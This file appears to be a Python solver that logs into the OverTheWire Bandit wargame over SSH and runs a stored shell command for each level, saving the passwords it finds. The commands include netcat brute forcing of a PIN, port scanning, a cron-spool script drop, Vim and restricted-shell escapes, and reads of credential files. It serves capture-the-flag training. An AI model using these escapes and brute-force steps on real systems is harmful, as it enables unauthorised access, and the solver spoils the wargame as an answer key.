#!/usr/bin/env python3
import paramiko
import tempfile
import os
import time
import json
import argparse

ARCHIVE_FILE = "bandit_progress.json"

def load_archive():
    if os.path.exists(ARCHIVE_FILE):
        with open(ARCHIVE_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_archive(archive):
    with open(ARCHIVE_FILE, 'w') as f:
        json.dump(archive, f, indent=2)

def initialize_ssh(host, username, password, port):
    client = paramiko.client.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(host, username=username, password=password, port=port)
    return client

def initialize_ssh_key(host, username, key_path, port):
    pkey = paramiko.RSAKey.from_private_key_file(key_path)
    client = paramiko.client.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(host, username=username, pkey=pkey, port=port)
    return client

def run_command(client, command, timeout=120):
    stdin, stdout, stderr = client.exec_command('bash -c \''+command+'\'', timeout=timeout)
    
    start_time = time.time()
    while not stdout.channel.exit_status_ready():
        if time.time() - start_time > timeout:
            stdout.channel.close()
            raise TimeoutError(f"Command timed out after {timeout} seconds")
        time.sleep(0.1)
    
    return stdout.read().decode().strip()

def run_command_locally(command):
    return os.popen(command).read().strip()

def bandit26_vim_exploit(client):
    print('Starting tiny terminal and activating Vim mode...')
    channel = client.invoke_shell(term='vt100', width=20, height=5)
    channel.send('v')
    time.sleep(1)
    print('Setting shell...')
    channel.send(':set shell=/bin/bash\r')
    time.sleep(1)
    print('Starting shell...')
    channel.send(':shell\r')
    time.sleep(1)
    while channel.recv_ready():
        channel.recv(4096)
    print('Getting password...')
    channel.send('./bandit27-do cat /etc/bandit_pass/bandit27\r')
    time.sleep(1)
    output = ""
    while channel.recv_ready():
        chunk = channel.recv(4096).decode('utf-8', errors='ignore')
        output += chunk.strip()
        time.sleep(0.1)
    
    channel.close()
    return output.splitlines()[2]

def bandit32_shellescape(client):
    channel = client.invoke_shell(term='vt100')
    time.sleep(1)
    print('Escaping bashjail...')
    channel.send('$0\n')
    time.sleep(1)
    while channel.recv_ready():
        channel.recv(4096)
    print('Getting password...')
    channel.send('cat /etc/bandit_pass/bandit33\n')
    time.sleep(1)
    output = ""
    while channel.recv_ready():
        chunk = channel.recv(4096).decode('utf-8', errors='ignore')
        output += chunk
        time.sleep(0.1)
    channel.close()
    
    return output.splitlines()[1]

def create_temp_key(key_content):
    if not key_content or not key_content.strip():
        raise ValueError("Key content is empty")
    
    temp_file = tempfile.NamedTemporaryFile(mode="w+", delete=False, encoding='utf-8')
    temp_file.write(key_content)
    temp_file.close()
    os.chmod(temp_file.name, 0o600)
    return temp_file.name

def get_commands():
    return [
        'cat readme | grep -o "[a-zA-Z0-9]*" | tail -1',
        'cat ./-',
        'cat ./--spaces\\ in\\ this\\ filename--',
        'cat inhere/...Hiding-From-You',
        'cat inhere/-file07',
        'find . -type f ! -executable -size 1033c -exec cat {} \\; | tr -d "[:space:]"',
        'find / -group bandit6 -user bandit7 -size 33c -exec cat {} \\; 2>/dev/null',
        'cat data.txt | grep "millionth" | sed "s/millionth[[:space:]]*//"',
        'cat data.txt | sort | uniq -u',
        'cat data.txt | grep -Eoa "=[=]+[A-Za-z0-9 ]+" | tail -1 | sed "s/\\=* //"',
        'cat data.txt | grep -E "[A-Za-z0-9+]+" | base64 -d | sed "s/.* //g"',
        'cat data.txt | tr "A-Za-z" "N-ZA-Mn-za-m" | sed "s/.* //g"',
        'cat data.txt | xxd -r | gunzip -d | bzip2 -d | tar xzOf - | tar xOf - | bzip2 -d | tar xOf - | gunzip -d | sed "s/.* //g"',
        'cat sshkey.private',
        'cat /etc/bandit_pass/bandit14 | nc localhost 30000 | sed "/^[[:space:]]*$/d" | tail -1',
        'cat /etc/bandit_pass/bandit14 | nc localhost 30000 | sed "/^[[:space:]]*$/d" | tail -1 | openssl s_client -connect localhost:30001 -ign_eof -quiet | sed "/^[[:space:]]*$/d" | tail -1',
        '''nmap -T5 -p31000-32000 localhost | grep "/tcp" | cut -d"/" -f1 | xargs -I {} sh -c "cat /etc/bandit_pass/bandit14 | nc localhost 30000 | sed \\\"/^[[:space:]]*$/d\\\" | tail -1 | openssl s_client -connect localhost:30001 -ign_eof -quiet | sed \\\"/^[[:space:]]*$/d\\\" | tail -1 | timeout 2 openssl s_client -connect localhost:{} -ign_eof -quiet" | sed "1,/Correct/d"''',
        'diff passwords.old passwords.new | tail -1 | cut -c3-',
        'cat readme',
        './bandit20-do cat /etc/bandit_pass/bandit20 | tee /tmp/bandit20_pass_sealldev',
        '''PASS=$(cat /tmp/bandit20_pass_sealldev);mkfifo /tmp/pipe$$ && (echo "$PASS" > /tmp/pipe$$ &) && timeout 2 nc -lvnp 1337 < /tmp/pipe$$ 2>/dev/null & sleep 0.2 && ./suconnect 1337 > /dev/null 2>/dev/null && rm -f /tmp/pipe$$''',
        'cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv',
        'cat /tmp/8ca319486bfbbc3663ea0fbe81326349',
        '''rm /tmp/bandit$$.sh 2>/dev/null; echo "#!/bin/bash" > /tmp/bandit$$.sh; echo "cat /etc/bandit_pass/bandit24 > /tmp/banditpass_$$" >> /tmp/bandit$$.sh; chmod +x /tmp/bandit$$.sh; cp /tmp/bandit$$.sh /var/spool/bandit24/foo/bandit$$.sh; counter=0; while [ ! -e "/tmp/banditpass_$$" ] && [ $counter -lt 600 ]; do sleep 0.1; counter=$((counter + 1)); done; if [ -e "/tmp/banditpass_$$" ]; then cat /tmp/banditpass_$$; else echo "TIMEOUT"; fi''',
        '''PASS=$(cat /tmp/bandit24_pass_sealldev); for i in {0000..9999}; do echo "$PASS $i"; done | nc localhost 30002 >> /tmp/out$$; cat /tmp/out$$ | grep "user bandit25 is" | sed "s/.* //g" | uniq''',
        'cat bandit26.sshkey',
        'Custom Vim Script', # VIM
        '''expect -c "spawn git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo /tmp/bandit27_repo; expect \\"*password*\\"; send \\"PREVPASSWORD\\r\\"; expect eof" >/dev/null 2>&1 && cat /tmp/bandit27_repo/README | sed "s/.* //g" && rm -rf /tmp/bandit27_repo''',
        '''expect -c "spawn git clone ssh://bandit28-git@bandit.labs.overthewire.org:2220/home/bandit28-git/repo /tmp/bandit28_repo; expect \\"*password*\\"; send \\"PREVPASSWORD\\r\\"; expect eof; spawn bash -c \\"cd /tmp/bandit28_repo && git reset --hard 68314e012fbaa192abfc9b78ac369c82b75fab8f && cat README.md | grep password | sed 's/.* //g' && cd / && rm -rf /tmp/bandit28_repo\\"; expect eof" | tail -1''',
        '''expect -c "spawn git clone ssh://bandit29-git@bandit.labs.overthewire.org:2220/home/bandit29-git/repo /tmp/bandit29_repo; expect \\"*password*\\"; send \\"PREVPASSWORD\\r\\"; expect eof; spawn bash -c \\"cd /tmp/bandit29_repo && git switch dev && cat README.md | grep password | sed 's/.* //g' && cd / && rm -rf /tmp/bandit29_repo\\"; expect eof" | tail -1''',
        '''expect -c "spawn git clone ssh://bandit30-git@bandit.labs.overthewire.org:2220/home/bandit30-git/repo /tmp/bandit30_repo; expect \\"*password*\\"; send \\"PREVPASSWORD\\r\\"; expect eof; spawn bash -c \\"cd /tmp/bandit30_repo && git cat-file -p 84368f3a7ee06ac993ed579e34b8bd144afad351 && cd / && rm -rf /tmp/bandit30_repo\\"; expect eof" | tail -1''',
        '''expect -c "spawn git clone ssh://bandit31-git@bandit.labs.overthewire.org:2220/home/bandit31-git/repo /tmp/bandit31_repo; expect \\"*password*\\"; send \\"PREVPASSWORD\\r\\"; expect eof; spawn bash -c \\"cd /tmp/bandit31_repo && rm .gitignore && echo 'May I come in?' > key.txt && git add . && git commit -am 'key' && git push\\"; expect \\"*password*\\"; send \\"PREVPASSWORD\\r\\"; expect eof; spawn bash -c \\"cd / && rm -rf /tmp/bandit31_repo\\"; expect eof" | grep 'remote: ' | sed "s/remote: //g" | sed '/.* .*/!d' | tail -1 | sed $'s,\\x1b\\\\[[0-9;]*[a-zA-Z],,g';''',
        'Bash Jail Escape' #bash jail
    ]

def solve_level(level, password, key_path=None):
    commands = get_commands()
    host = "bandit.labs.overthewire.org"
    port = 2220
    username = f"bandit{level}"
    
    for attempt in range(3):
        try:
            print(f"⚡︎ Level {level} (attempt {attempt + 1})...")
            print(f"⟳ Command: `{commands[level]}`")
            
            if level in [14, 15, 16, 17, 26]:
                if level == 17:
                    username = f"bandit{level}"
                elif level == 26:
                    username = "bandit26"
                else:
                    username = "bandit14"
                client = initialize_ssh_key(host, username, key_path, port)
            elif level == 32:
                archive = load_archive()
                level31_password = archive[str(level-1)]['password']
                print(f"Using level 31 password for SSH: {level31_password}")
                client = initialize_ssh(host, username, level31_password, port)
            else:
                client = initialize_ssh(host, username, password, port)
            
            if level == 26:
                result = bandit26_vim_exploit(client)
            elif level == 32:
                result = bandit32_shellescape(client)
            elif level in [27, 28, 29, 30, 31]:
                archive = load_archive()
                print(f"Using previous password: {archive[str(level-1)]['password']}")
                commands[level] = commands[level].replace("PREVPASSWORD", archive[str(level-1)]['password'])
                result = run_command_locally(commands[level])
            else:
                result = run_command(client, commands[level])
            
            client.close()
            
            if result and result.strip():
                if level == 0:
                    print(f"    ★ Found {level} password: {result}\n")
                else:
                    print(f"    ★ Found {level}->{level+1} password: {result}\n")
                
                if level == 25:
                    print(f"    → SSH Key length: {len(result)} characters")
                    if not result.startswith('-----BEGIN'):
                        print(f"    ⚠ Warning: Key doesn't start with -----BEGIN")
                
                return result
            else:
                print(f"    ✗ Empty result on attempt {attempt + 1}")
                
        except Exception as e:
            print(f"    ✗ Attempt {attempt + 1} failed: {e}")
            if 'client' in locals():
                client.close()
            
        if attempt < 2:
            time.sleep(1)
    
    raise Exception(f"Level {level} failed after 3 attempts")

def main():
    parser = argparse.ArgumentParser(description='Bandit CTF Solver')
    parser.add_argument('--start', type=int, default=0, help='Start at specific level (default: 0)')
    parser.add_argument('--password', type=str, help='Password for start level')
    parser.add_argument('--key', type=str, help='SSH key file path for start level')
    args = parser.parse_args()
    
    archive = load_archive()
    commands = get_commands()
    
    if args.start > 0:
        if args.password:
            password = args.password
        elif args.key:
            password = None
        elif str(args.start) in archive:
            stored = archive[str(args.start)]
            password = stored.get('password') or stored.get('key')
            if not password:
                print(f"No password/key found for level {args.start} in archive")
                return
        else:
            print(f"Level {args.start} not found in archive. Use --password or --key")
            return
        
        print(f"Starting from level {args.start}")
        if args.key:
            print(f"Using key file: {args.key}")
        else:
            print(f"Using password: {password}")
    else:
        password = "bandit0"
    
    key_path = args.key
    
    for level in range(args.start, len(commands)):
        if level in [14, 15, 16, 17, 26]:
            if not key_path or not os.path.exists(key_path):
                if level == 26 and str(25) in archive:
                    key_content = archive[str(25)].get('key', password)
                else:
                    key_content = password
                key_path = create_temp_key(key_content)
        
        try:
            password = solve_level(level, password, key_path)
            
            is_key = level in [13, 17, 25]
            entry = {
                'level': level,
                'timestamp': time.time(),
                'key' if is_key else 'password': password
            }
            archive[str(level)] = entry
            save_archive(archive)
            
        except Exception as e:
            print(f"Failed at level {level}: {e}")
            break
        
        if level in [16, 17, 26] and key_path and not args.key:
            os.remove(key_path)
            key_path = None

if __name__ == "__main__":
    main()